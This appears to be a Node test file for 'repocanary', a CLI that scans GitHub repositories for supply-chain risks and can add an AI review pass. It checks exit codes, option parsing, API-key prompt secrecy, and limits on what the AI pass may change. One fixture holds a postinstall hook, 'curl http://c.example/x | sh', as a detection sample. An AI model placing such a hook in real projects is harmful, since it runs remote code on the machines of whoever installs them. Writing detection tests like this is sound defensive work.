import { makeClient } from "./helpers.js";
import test from "node:test";
import assert from "node:assert/strict";
import { PassThrough, Writable } from "node:stream";
import { main, parseArgs, promptForApiKey } from "../cli.js";
import { GitHubError } from "../src/github.js";

/** A writable stream that records everything written, readable synchronously. */
function capture() {
  let text = "";
  const stream = new Writable({
    write(chunk, encoding, callback) {
      text += chunk.toString();
      callback();
    },
  });
  Object.defineProperty(stream, "text", { get: () => text });
  return stream;
}

/** A stdin that behaves enough like a terminal for readline, and answers once. */
function fakeTtyAnswering(answer) {
  const stream = new PassThrough();
  stream.isTTY = true;
  stream.setRawMode = () => stream;
  process.nextTick(() => stream.write(`${answer}\n`));
  return stream;
}

async function run(argv, client, env = {}, stdin = { isTTY: false }, aiFetch = undefined) {
  const stdout = capture();
  const stderr = capture();
  // The key prompt is drawn on stderr and only when both streams are a
  // terminal, so the fake stderr has to look like one.
  stderr.isTTY = true;
  const code = await main(argv, { client, stdin, stdout, stderr, env, ...(aiFetch ? { aiFetch } : {}) });
  return { code, stdout: stdout.text, stderr: stderr.text };
}

/** A provider that answers with one fixed verdict, so the pass can be driven. */
function fakeProvider(verdict, assessment = "Reviewed the evidence.") {
  return async () => ({
    ok: true,
    text: async () =>
      JSON.stringify({ candidates: [{ content: { parts: [{ text: JSON.stringify({ verdict, assessment }) }] } }] }),
  });
}

const GREEN = { "index.js": "export const x = 1;\n" };
const YELLOW = { "package.json": JSON.stringify({ name: "x", dependencies: { helper: "github:acme/helper" } }) };
const RED = { "package.json": JSON.stringify({ name: "x", scripts: { postinstall: "curl http://c.example/x | sh" } }) };

test("INVARIANT: exit codes are honest, 0 green 1 yellow 2 red", async () => {
  assert.equal((await run(["acme/widget"], makeClient(GREEN))).code, 0);
  assert.equal((await run(["acme/widget"], makeClient(YELLOW))).code, 1);
  assert.equal((await run(["acme/widget"], makeClient(RED))).code, 2);
});

test("INVARIANT: every failure exits 3, never a false green", async () => {
  const failures = [
    new GitHubError("Repository not found.", "not-found", 404),
    new GitHubError("Rate limit reached.", "rate-limited", 403),
    new GitHubError("Could not reach api.github.com.", "network"),
    new GitHubError("GitHub returned a server error (502).", "server", 502),
    new GitHubError("Repository is empty.", "empty-repo", 409),
    new Error("something entirely unexpected"),
  ];
  for (const err of failures) {
    const client = {
      fetchRepo: async () => {
        throw err;
      },
      fetchFile: async () => null,
    };
    const { code, stderr } = await run(["acme/widget"], client);
    assert.equal(code, 3, err.message);
    assert.ok(stderr.includes("Could not check"), err.message);
    assert.ok(stderr.length > 20, "error messages must say what happened");
  }
});

test("an invalid target exits 3 with guidance", async () => {
  const { code, stderr } = await run(["not a repo url"], makeClient(GREEN));
  assert.equal(code, 3);
  assert.ok(stderr.includes("owner/repo"));
});

test("unknown options exit 3, not silently ignored", async () => {
  const { code, stderr } = await run(["acme/widget", "--fast"], makeClient(GREEN));
  assert.equal(code, 3);
  assert.ok(stderr.includes("--fast"));
});

test("--json emits parseable JSON with the verdict", async () => {
  const { code, stdout } = await run(["acme/widget", "--json"], makeClient(RED));
  assert.equal(code, 2);
  const doc = JSON.parse(stdout);
  assert.equal(doc.verdict, "red");
});

test("--sarif emits parseable SARIF", async () => {
  const { stdout } = await run(["acme/widget", "--sarif"], makeClient(RED));
  assert.equal(JSON.parse(stdout).version, "2.1.0");
});

test("--json and --sarif together is an error", async () => {
  const { code } = await run(["acme/widget", "--json", "--sarif"], makeClient(GREEN));
  assert.equal(code, 3);
});

test("--help prints usage and exits 0; no arguments exits 3", async () => {
  const help = await run(["--help"], makeClient(GREEN));
  assert.equal(help.code, 0);
  assert.ok(help.stdout.includes("Exit codes"));

  const bare = await run([], makeClient(GREEN));
  assert.equal(bare.code, 3);
  assert.equal(bare.stdout, "", "a usage error must not put the help on stdout");
  assert.match(bare.stderr, /--help/);
});

test("--ai with no key and no terminal keeps the static verdict and names the env vars", async () => {
  const { code, stdout } = await run(["acme/widget", "--ai"], makeClient(YELLOW), {});
  assert.equal(code, 1);
  assert.ok(stdout.includes("AI pass skipped"));
  for (const envKey of ["GEMINI_API_KEY", "GROQ_API_KEY", "OPENAI_API_KEY", "ANTHROPIC_API_KEY"]) {
    assert.ok(stdout.includes(envKey), envKey);
  }
});

test("INVARIANT: a key is never accepted as a command-line flag", async () => {
  // Flags land in shell history and the process list, so there must be no
  // way to pass a key as an argument.
  for (const flag of ["--ai-key", "--api-key", "--key", "--token"]) {
    const { code, stderr } = await run(["acme/widget", flag, "sk-fake"], makeClient(GREEN));
    assert.equal(code, 3, flag);
    assert.ok(stderr.includes("Unknown option"), flag);
  }
});

test("--ai-provider rejects an unknown provider and lists the valid ones", async () => {
  const { code, stderr } = await run(["acme/widget", "--ai-provider", "hal9000"], makeClient(GREEN));
  assert.equal(code, 3);
  assert.ok(stderr.includes("hal9000"));
  assert.ok(stderr.includes("anthropic"));
});

test("parseArgs accepts each valid provider and implies --ai", () => {
  for (const name of ["gemini", "groq", "openai", "anthropic"]) {
    const opts = parseArgs(["owner/repo", "--ai-provider", name]);
    assert.equal(opts.aiProvider, name);
    assert.equal(opts.ai, true);
  }
});

test("parseArgs handles every option", () => {
  const opts = parseArgs(["owner/repo", "--json", "--ref", "dev", "--ai"]);
  assert.deepEqual(opts, {
    target: "owner/repo",
    json: true,
    sarif: false,
    ai: true,
    aiProvider: null,
    ref: "dev",
    help: false,
    version: false,
  });
});

test("promptForApiKey returns null when stdin is not a terminal", async () => {
  assert.equal(await promptForApiKey({ stdin: { isTTY: false }, stdout: capture() }), null);
});

test("a pasted key is routed to the provider its shape identifies", async () => {
  // A fake TTY that replies with an Anthropic-shaped key, and a provider
  // call that would only be reached if the key was routed correctly.
  const stdin = fakeTtyAnswering("sk-ant-fake-fixture-key");
  const { code, stdout } = await run(["acme/widget", "--ai"], makeClient(YELLOW), {}, stdin);
  assert.equal(code, 1);
  assert.ok(stdout.includes("pasted Anthropic key"));
  assert.ok(stdout.includes("ANTHROPIC_API_KEY"), "should say how to skip the prompt next time");
});

test("a pasted key of unknown shape asks for --ai-provider instead of guessing", async () => {
  const stdin = fakeTtyAnswering("not-a-recognizable-key");
  const { stdout } = await run(["acme/widget", "--ai"], makeClient(YELLOW), {}, stdin);
  assert.ok(stdout.includes("could not tell which provider"));
  assert.ok(stdout.includes("--ai-provider"));
});

test("INVARIANT: a pasted key never appears in the report", async () => {
  const secret = "sk-ant-fake-fixture-key";
  const stdin = fakeTtyAnswering(secret);
  const { stdout } = await run(["acme/widget", "--ai", "--json"], makeClient(YELLOW), {}, stdin);
  assert.ok(!stdout.includes(secret), "the key must never be echoed into output");
});

const BAD_ARGS = [
  { argv: ["o/r", "--ref", "--sarif"], match: /--ref needs a branch/ },
  { argv: ["o/r", "--ref"], match: /--ref needs a branch/ },
  { argv: ["o/r", "--ai-provider"], match: /Unknown AI provider: \(missing\)/ },
  { argv: ["o/r", "extra"], match: /Unexpected extra argument: extra/ },
];

for (const { argv, match } of BAD_ARGS) {
  test(`parseArgs rejects ${JSON.stringify(argv)}`, () => {
    assert.throws(() => parseArgs(argv), match);
  });
}

test("--version prints the package version and exits 0", async () => {
  for (const argv of [["-v"], ["--version"], ["acme/widget", "--version"]]) {
    const { code, stdout } = await run(argv, makeClient(GREEN));
    assert.equal(code, 0, argv.join(" "));
    assert.match(stdout, /^repocanary \d+\.\d+\.\d+/m);
  }
});

test("the key prompt settles on EOF instead of hanging", async () => {
  // Ctrl-D closes the stream without an answer. Before this the promise never
  // settled and the CLI hung after the scan had already finished.
  const stdin = new PassThrough();
  stdin.isTTY = true;
  stdin.setRawMode = () => stdin;
  const stderr = capture();
  stderr.isTTY = true;
  process.nextTick(() => stdin.end());

  const answer = await promptForApiKey({ stdin, stdout: capture(), stderr });
  assert.equal(answer, null);
});

test("a multi-line pasted key is joined, not truncated to its first line", async () => {
  const stdin = new PassThrough();
  stdin.isTTY = true;
  stdin.setRawMode = () => stdin;
  const stderr = capture();
  stderr.isTTY = true;
  process.nextTick(() => stdin.write("AIzaFIRSTHALF SECOND_HALF\n"));

  const answer = await promptForApiKey({ stdin, stdout: capture(), stderr });
  assert.equal(answer, "AIzaFIRSTHALFSECOND_HALF");
});

test("the pasted key is never echoed to the stream the prompt is drawn on", async () => {
  const secret = "AIzaFakeKeyForTest";
  const stdin = fakeTtyAnswering(secret);
  const stderr = capture();
  stderr.isTTY = true;

  await promptForApiKey({ stdin, stdout: capture(), stderr });

  // SECURITY.md promises the key is hidden while typed, and the mechanism is
  // an override of readline's private _writeToOutput. If a Node release stops
  // routing echo through it, the override silently stops applying and the key
  // lands in the terminal and in scrollback. Nothing else would notice.
  assert.ok(!stderr.text.includes(secret), "the key was echoed to stderr");
  assert.match(stderr.text, /Paste an AI provider API key/);
});

test("the key prompt never writes to stdout, so --json stays parseable", async () => {
  const stdin = fakeTtyAnswering("AIzaFakeKeyForTest");
  const stdout = capture();
  const stderr = capture();
  stderr.isTTY = true;

  await promptForApiKey({ stdin, stdout, stderr });
  assert.equal(stdout.text, "");
  assert.match(stderr.text, /Paste an AI provider API key/);
});

test("the key prompt is skipped when stderr is not a terminal", async () => {
  const stdin = fakeTtyAnswering("AIzaFakeKeyForTest");
  assert.equal(await promptForApiKey({ stdin, stdout: capture(), stderr: capture() }), null);
});

// The branch that swaps a verdict after the AI pass. It had no end-to-end
// test because there was no way to inject a provider into main(), and a
// report-layer test that builds a cleared result by hand cannot see what the
// scanner actually does.

// A yellow the model is allowed to clear. YELLOW above is an off-registry
// dependency, which parseReply refuses to clear however the model answers.
const YELLOW_CLEARABLE = {
  "package.json": JSON.stringify({ name: "x" }),
  ".vscode/tasks.json": '{"tasks":[{"command":"npm","args":["run","watch"],"runOptions":{"runOn":"folderOpen"}}]}',
};

test("the AI pass can clear a yellow, and the report says who cleared it", async () => {
  const { code, stdout } = await run(
    ["acme/widget", "--ai"],
    makeClient(YELLOW_CLEARABLE),
    { GEMINI_API_KEY: "fixture-key" },
    { isTTY: false },
    fakeProvider("green", "The task only starts the project's own watcher."),
  );
  assert.equal(code, 0);
  assert.match(stdout, /Gemini/);
  assert.match(stdout, /own watcher/);
});

test("an AI red over a non-red scan lands as yellow, never as red", async () => {
  // Red means a signature fired, and a model's opinion is not a signature.
  const { code, stdout } = await run(
    ["acme/widget", "--ai"],
    makeClient(YELLOW),
    { GEMINI_API_KEY: "fixture-key" },
    { isTTY: false },
    fakeProvider("red", "This looks deliberate to me."),
  );
  assert.equal(code, 1);
  assert.doesNotMatch(stdout, /Verdict: RED/);
});

test("the AI pass cannot lower a red", async () => {
  const { code } = await run(
    ["acme/widget", "--ai"],
    makeClient(RED),
    { GEMINI_API_KEY: "fixture-key" },
    { isTTY: false },
    fakeProvider("green", "Looks fine to me."),
  );
  assert.equal(code, 2);
});

test("a registry redirection is not cleared, whatever the model answers", async () => {
  // The system prompt asks for this, and the evidence is written by the
  // person being judged, so it is enforced rather than requested.
  const { code } = await run(
    ["acme/widget", "--ai"],
    makeClient(YELLOW),
    { GEMINI_API_KEY: "fixture-key" },
    { isTTY: false },
    fakeProvider("green", "Nothing to see here."),
  );
  assert.equal(code, 1);
});

test("a failed scan still writes a parseable report in --json and --sarif mode", async () => {
  const client = {
    fetchRepo: async () => {
      throw new GitHubError("Rate limit reached.", "rate-limited", 403);
    },
    fetchFile: async () => null,
  };
  const json = await run(["acme/widget", "--json"], client);
  assert.equal(json.code, 3);
  const doc = JSON.parse(json.stdout);
  assert.equal(doc.verdict, "error");
  assert.equal(doc.exitCode, 3);
  assert.equal(doc.error.kind, "rate-limited");

  const sarif = await run(["acme/widget", "--sarif"], client);
  assert.equal(sarif.code, 3);
  assert.equal(JSON.parse(sarif.stdout).runs[0].invocations[0].executionSuccessful, false);
});

test("a link to a branch says the branch is not what gets scanned", async () => {
  const { code, stderr } = await run(["https://github.com/acme/widget/tree/dev"], makeClient(GREEN));
  assert.equal(code, 0);
  assert.match(stderr, /--ref/);
  const explicit = await run(["https://github.com/acme/widget/tree/dev", "--ref", "dev"], makeClient(GREEN));
  assert.doesNotMatch(explicit.stderr, /not used/);
});
